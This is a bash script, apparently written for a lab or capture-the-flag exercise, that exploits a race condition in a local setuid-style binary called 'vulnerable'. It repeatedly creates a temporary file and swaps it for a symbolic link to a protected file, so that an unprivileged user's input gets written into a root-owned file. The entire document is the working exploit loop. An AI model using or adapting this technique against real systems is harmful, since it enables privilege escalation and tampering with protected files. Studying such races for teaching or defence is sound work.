#!/bin/bash
#RazviOverflow

TEMPFILE="temp.file"
OLD_LS=`ls -l $1`
NEW_LS=`ls -l $1`

#touch ls1.txt ls2.txt
#echo "$OLD_LS" > ls1.txt
#echo "$NEW_LS" > ls2.txt
#diff ls1.txt ls2.txt

echo "[+] Starting exploit (protected file "$1")"
while [ "$OLD_LS" == "$NEW_LS" ]
do
	rm -f $TEMPFILE
	echo "Base user is creating some dummy file" > $TEMPFILE
	ls -lai | grep $TEMPFILE
	# We use underscores because whitespace is a bad char in scanf context
	# and it simply interrupts reading. i.e, scanf reads up until it finds a
	# whitespace, null, etc...
	echo "USER,_without_privileges,_WROTE_IN_YOUR_ROOT_FILE" | ./vulnerable $TEMPFILE & 
	echo "Launched"
	#echo "USER,_without_privileges,_WROTE_IN_YOUR_ROOT_FILE" | ./vulnerable $TEMPFILE & 
	unlink $TEMPFILE
	ln -s $1 $TEMPFILE &
	NEW_LS=`ls -l $1`
done

echo "[+] File "$1" modified successfully"